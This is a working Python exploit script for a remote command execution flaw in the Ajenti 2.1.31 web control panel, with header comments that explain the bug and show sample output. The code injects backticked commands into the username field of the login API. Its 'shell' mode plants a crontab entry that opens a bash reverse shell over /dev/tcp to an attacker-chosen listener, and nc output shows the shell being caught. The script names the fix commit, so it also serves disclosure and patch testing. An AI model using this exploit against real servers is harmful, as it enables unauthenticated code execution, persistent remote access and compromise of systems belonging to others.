# Title: Ajenti 2.1.31 - Remote Code Execution
# Author: Jeremy Brown
# Date: 2019-10-13
# Software Link: https://github.com/ajenti/ajenti
# CVE: N/A
# Tested on: Ubuntu Linux

#!/usr/bin/python
# ajentix.py
#
# Ajenti Remote Command Execution Exploit
#
# -------
# Details
# -------
#
# Ajenti is a web control panel written in Python and AngularJS.
#
# One can locally monitor executed commands on the server while testing
#
# $ sudo ./exec-notify (google for "exec-notify.c", modify output as needed)
# sending proc connector: PROC_CN_MCAST_LISTEN... sent
# Reading process events from proc connector.
# Hit Ctrl-C to exit
#
# Browse over to https://server:8000/view/login/normal to login
#
# .....
# pid=9889 executed [/bin/sh -c /bin/su -c "/bin/echo SUCCESS" - test ]
# pid=9889 executed [/bin/su -c /bin/echo SUCCESS - test ]
#
# Modified the JSON request username value to be `id`
#
# pid=7514 executed [/bin/sh -c /bin/su -c "/bin/echo SUCCESS" - `id` ]
# pid=7516 executed [id ]
# pid=7514 executed [/bin/su -c /bin/echo SUCCESS - uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup) ]
#
# *ACK.....*
#
# Also the login routine times out after 5 seconds (see auth.py), which
# makes an interactive shell relatively ephemeral. So, we cron job.
#
# $ python3 ajentix.py server.ip shell local-listener.ip
# Done!
#
# $ nc -v -l -p 5555
# Listening on [0.0.0.0] (family 0, port 5555)
# Connection from server.domain 41792 received!
# bash: cannot set terminal process group (18628): Inappropriate ioctl for device
# bash: no job control in this shell
# nobody@server:/var/spool/cron$ ps
#   PID TTY          TIME CMD
#  6386 ?        00:00:00 /usr/local/bin/ <-- ajenti-panel worker
# 18849 ?        00:00:00 sh
# 18851 ?        00:00:00 bash
# 18859 ?        00:00:00 ps
#
#
# Tested Ajenti 2.1.31 on Ubuntu 18.04, fixed in 2.1.32
#
# Fix commit: https://github.com/ajenti/ajenti/commit/7aa146b724e0e20cfee2c71ca78fafbf53a8767c
#
#

import os
import sys
import ssl
import json
import urllib.request as request

def main():
	if(len(sys.argv) < 2):
		print("Usage: %s <host> [\"cmd\" or shell...ip]\n" % sys.argv[0])
		print("Eg:    %s 1.2.3.4 \"id\"" % sys.argv[0])
		print("...    %s 1.2.3.4 shell 5.6.7.8\n" % sys.argv[0])
		return

	host = sys.argv[1]
	cmd = sys.argv[2]

	if(cmd == 'shell'):
		if(len(sys.argv) < 4):
			print("Error: need ip to connect back to for shell")
			return

		ip = sys.argv[3]

		shell = "`echo \"* * * * * bash -i >& /dev/tcp/" + ip + "/5555 0>&1\" > /tmp/cronx; crontab /tmp/cronx`"
		username = shell

	else:
		username = "`" + cmd + "`"

	body = json.dumps({'username':username, 'password':'test', 'mode':'normal'})
	byte = body.encode('utf-8')

	url = "https://" + host + ":8000" + "/api/core/auth"

	try:
		req = request.Request(url)

		req.add_header('Content-Type', 'application/json; charset=utf-8')
		req.add_header('Content-Length', len(byte))

		request.urlopen(req, byte, context=ssl._create_unverified_context()) # ignore the cert

	except Exception as error:
		print("Error: %s" % error)
		return

	print("Done!")


if(__name__ == '__main__'):
	main()